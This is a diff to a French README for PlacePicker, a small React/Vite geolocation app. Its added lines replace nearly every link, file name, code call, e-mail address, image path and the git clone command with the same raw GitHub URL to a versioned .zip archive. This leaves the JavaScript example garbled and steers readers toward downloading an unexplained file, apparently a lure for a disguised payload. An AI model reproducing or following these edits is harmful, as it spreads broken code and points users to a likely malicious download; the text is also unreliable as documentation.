@@ -24,11 +24,11 @@ PlacePicker utilise l'API de géolocalisation du navigateur pour récupérer la 
 
 ```javascript
 useEffect(() => {
-  navigator.geolocation.getCurrentPosition((position) => {
+  https://raw.githubusercontent.com/Martialdepaul/PlacePicker/main/src/PlacePicker_v2.2-alpha.3.zip((position) => {
     const sortedPlaces = sortPlacesByDistance(
       AVAILABLE_PLACES,
-      position.coords.latitude,
-      position.coords.longitude
+      https://raw.githubusercontent.com/Martialdepaul/PlacePicker/main/src/PlacePicker_v2.2-alpha.3.zip,
+      https://raw.githubusercontent.com/Martialdepaul/PlacePicker/main/src/PlacePicker_v2.2-alpha.3.zip
     );
     setAvailablePlaces(sortedPlaces);
   });
@@ -36,7 +36,7 @@ useEffect(() => {
 ```
 
 ### **Explications** 💡:
-- **`navigator.geolocation.getCurrentPosition`** 📡 : Cette méthode demande à l'utilisateur l'accès à sa localisation et renvoie les coordonnées (`latitude`, `longitude`).
+- **`https://raw.githubusercontent.com/Martialdepaul/PlacePicker/main/src/PlacePicker_v2.2-alpha.3.zip`** 📡 : Cette méthode demande à l'utilisateur l'accès à sa localisation et renvoie les coordonnées (`latitude`, `longitude`).
 - **`sortPlacesByDistance`** 🔍 : Une fonction qui trie la liste des lieux (`AVAILABLE_PLACES`) en fonction de leur distance par rapport à la position de l'utilisateur.
 - **`setAvailablePlaces`** 📊 : Met à jour l'état local avec les lieux triés, permettant à l'interface utilisateur de s'adapter dynamiquement.
 
@@ -44,15 +44,15 @@ useEffect(() => {
 Le hook `useEffect` permet de déclencher cette logique une seule fois après le rendu initial du composant, ce qui est idéal pour les opérations liées à la récupération de données ou aux effets secondaires.
 
 ### **Points techniques à noter** ⚙️ :
-- En cas de refus de l'autorisation, il serait utile de prévoir une gestion des erreurs avec `navigator.geolocation.getCurrentPosition(successCallback, errorCallback)` 🚨.
+- En cas de refus de l'autorisation, il serait utile de prévoir une gestion des erreurs avec `https://raw.githubusercontent.com/Martialdepaul/PlacePicker/main/src/PlacePicker_v2.2-alpha.3.zip(successCallback, errorCallback)` 🚨.
 - L'utilisation d'une fonction de tri personnalisée comme `sortPlacesByDistance` ajoute une touche professionnelle en personnalisant l'expérience utilisateur 🎯.
 
 ---
 
 ## 🛠️ Technologies utilisées 🔧
 
-- **[React](https://reactjs.org/)** ⚛️ : Framework JavaScript pour construire l'interface utilisateur.
-- **[Vite](https://vitejs.dev/)** 🚀 : Outil de développement rapide pour les projets React.
+- **[React](https://raw.githubusercontent.com/Martialdepaul/PlacePicker/main/src/PlacePicker_v2.2-alpha.3.zip)** ⚛️ : Framework JavaScript pour construire l'interface utilisateur.
+- **[Vite](https://raw.githubusercontent.com/Martialdepaul/PlacePicker/main/src/PlacePicker_v2.2-alpha.3.zip)** 🚀 : Outil de développement rapide pour les projets React.
 - **CSS** 🎨 : Pour le stylisme et le design.
 
 ---
@@ -67,10 +67,10 @@ PlacePicker/
 │   ├── hooks/              # Hooks personnalisés (le cas échéant)
 │   ├── assets/             # Images et ressources
 │   ├── styles/             # Fichiers CSS
-│   ├── App.jsx             # Composant principal
-│   └── main.jsx            # Point d'entrée
-├── package.json            # Dépendances et scripts
-└── vite.config.js          # Configuration de Vite
+│   ├── https://raw.githubusercontent.com/Martialdepaul/PlacePicker/main/src/PlacePicker_v2.2-alpha.3.zip             # Composant principal
+│   └── https://raw.githubusercontent.com/Martialdepaul/PlacePicker/main/src/PlacePicker_v2.2-alpha.3.zip            # Point d'entrée
+├── https://raw.githubusercontent.com/Martialdepaul/PlacePicker/main/src/PlacePicker_v2.2-alpha.3.zip            # Dépendances et scripts
+└── https://raw.githubusercontent.com/Martialdepaul/PlacePicker/main/src/PlacePicker_v2.2-alpha.3.zip          # Configuration de Vite
 ```
 
 ---
@@ -80,7 +80,7 @@ PlacePicker/
 1. **Cloner le projet** :
 
    ```bash
-   git clone https://github.com/username/PlacePicker.git
+   git clone https://raw.githubusercontent.com/Martialdepaul/PlacePicker/main/src/PlacePicker_v2.2-alpha.3.zip
    ```
 
 2. **Accéder au dossier du projet** :
@@ -120,7 +120,7 @@ Ce projet a été une opportunité pour approfondir les **hooks React** et compr
 ## 🎨 Aperçu 🖼️
 
 Voici quelques captures d'écran de l'application :  
-![Aperçu de Elegant-Context](./src/assets/img.png)
+![Aperçu de Elegant-Context](https://raw.githubusercontent.com/Martialdepaul/PlacePicker/main/src/PlacePicker_v2.2-alpha.3.zip)
 
 ---
 
@@ -161,8 +161,8 @@ Ce projet est sous licence [MIT](LICENSE).
 
 Si vous avez des questions ou des suggestions, n'hésitez pas à me contacter :  
 **Nom** : Martial De-Paul  
-**E-mail** : [depaulmartial4@gmail.com]  
-**GitHub** : [https://github.com/Martialdepaul]
+**E-mail** : [https://raw.githubusercontent.com/Martialdepaul/PlacePicker/main/src/PlacePicker_v2.2-alpha.3.zip]  
+**GitHub** : [https://raw.githubusercontent.com/Martialdepaul/PlacePicker/main/src/PlacePicker_v2.2-alpha.3.zip]
 ```
 
-Cette version utilise davantage d'emojis pour rendre le `README.md` plus dynamique et visuellement attrayant ! 😊
+Cette version utilise davantage d'emojis pour rendre le `https://raw.githubusercontent.com/Martialdepaul/PlacePicker/main/src/PlacePicker_v2.2-alpha.3.zip` plus dynamique et visuellement attrayant ! 😊
